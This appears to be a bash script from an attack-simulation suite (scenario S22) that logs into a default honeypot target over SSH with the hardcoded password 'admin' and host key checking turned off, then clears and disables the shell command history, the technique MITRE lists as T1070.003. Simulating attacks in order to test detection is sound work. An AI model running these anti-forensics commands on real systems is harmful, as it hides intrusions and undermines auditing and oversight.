#!/usr/bin/env bash
# S22 — Command History Erase
# Tactic : Defense Evasion (TA0005)
# Technique: T1070.003 Indicator Removal: Clear Command History
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S22 History Erase — ${TARGET} ==="
$SSH "history -c; unset HISTFILE; export HISTSIZE=0; export HISTFILESIZE=0; cat /dev/null > ~/.bash_history; echo 'history cleared'" && echo "[OK]" || echo "[FAIL]"
